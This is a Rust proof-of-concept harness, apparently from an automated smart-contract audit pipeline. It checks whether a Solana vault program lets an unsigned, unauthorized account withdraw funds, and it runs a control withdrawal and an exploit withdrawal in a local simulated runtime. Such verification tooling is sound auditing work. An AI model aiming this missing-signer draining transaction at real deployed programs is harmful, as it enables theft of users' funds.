//! DEFAULT TWO-SIDED PoC (overwritten by the colony per audit). Drives
//! target::process_instruction through the real solana-runtime SVM via
//! solana-program-test + BanksClient and asserts on the vault's stored balance.
//!
//! Uses ONE ProgramTest with two vault accounts (one banks server / one rayon
//! threadpool) so the two-sided check runs within the hardened sandbox's task
//! limit; RAYON_NUM_THREADS is also capped by the runner.
//!
//! CONTROL: a signed authority withdraws vault_ctrl -> balance 0 -> "CONTROL OK:".
//! EXPLOIT: an unauthorized non-signer withdraws vault_exploit -> on the vulnerable
//! program the balance is still drained -> "INVARIANT VIOLATED:" + exit(101); a
//! secure program rejects it -> "invariant held" -> NOT verified (no false-VERIFIED).

use solana_harness::target;
use solana_program_test::{processor, BanksClient, ProgramTest};
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};

const BAL: u64 = 1_000_000;

fn vault_account(program_id: Pubkey) -> Account {
    Account {
        lamports: 1_000_000_000,
        data: BAL.to_le_bytes().to_vec(),
        owner: program_id,
        executable: false,
        rent_epoch: 0,
    }
}

fn withdraw_ix(program_id: Pubkey, vault: Pubkey, authority: Pubkey, authority_signs: bool) -> Instruction {
    Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(vault, false),
            AccountMeta::new_readonly(authority, authority_signs),
        ],
        data: BAL.to_le_bytes().to_vec(),
    }
}

async fn balance_of(banks: &mut BanksClient, vault: Pubkey) -> u64 {
    match banks.get_account(vault).await.ok().flatten() {
        Some(a) if a.data.len() >= 8 => u64::from_le_bytes(a.data[0..8].try_into().unwrap()),
        _ => u64::MAX,
    }
}

#[tokio::main]
async fn main() {
    let program_id = Pubkey::new_unique();
    let vault_ctrl = Pubkey::new_unique();
    let vault_exploit = Pubkey::new_unique();
    let authority = Keypair::new();

    let mut pt =
        ProgramTest::new("solana_harness", program_id, processor!(target::process_instruction));
    pt.add_account(vault_ctrl, vault_account(program_id));
    pt.add_account(vault_exploit, vault_account(program_id));
    let (mut banks, payer, recent) = pt.start().await;

    // CONTROL: the legitimate authority (a signer) withdraws.
    let mut tx_c = Transaction::new_with_payer(
        &[withdraw_ix(program_id, vault_ctrl, authority.pubkey(), true)],
        Some(&payer.pubkey()),
    );
    tx_c.sign(&[&payer, &authority], recent);
    let _ = banks.process_transaction(tx_c).await;
    let ctrl = balance_of(&mut banks, vault_ctrl).await;
    if ctrl == 0 {
        eprintln!("CONTROL OK: authorized signer withdrew the vault balance {} -> 0", BAL);
    } else {
        eprintln!("control failed: authorized withdraw not accepted (balance {})", ctrl);
        std::process::exit(2);
    }

    // EXPLOIT: an unauthorized non-signer withdraws a fresh vault.
    let bogus_authority = Pubkey::new_unique();
    let recent2 = banks.get_latest_blockhash().await.unwrap_or(recent);
    let mut tx_e = Transaction::new_with_payer(
        &[withdraw_ix(program_id, vault_exploit, bogus_authority, false)],
        Some(&payer.pubkey()),
    );
    tx_e.sign(&[&payer], recent2);
    let _ = banks.process_transaction(tx_e).await;
    let exploit = balance_of(&mut banks, vault_exploit).await;
    if exploit == 0 {
        eprintln!("INVARIANT VIOLATED: unauthorized non-signer drained the vault balance {} -> 0 (MissingSignerCheck)", BAL);
        std::process::exit(101);
    } else {
        eprintln!("invariant held: unauthorized withdraw rejected (balance {})", exploit);
    }
}
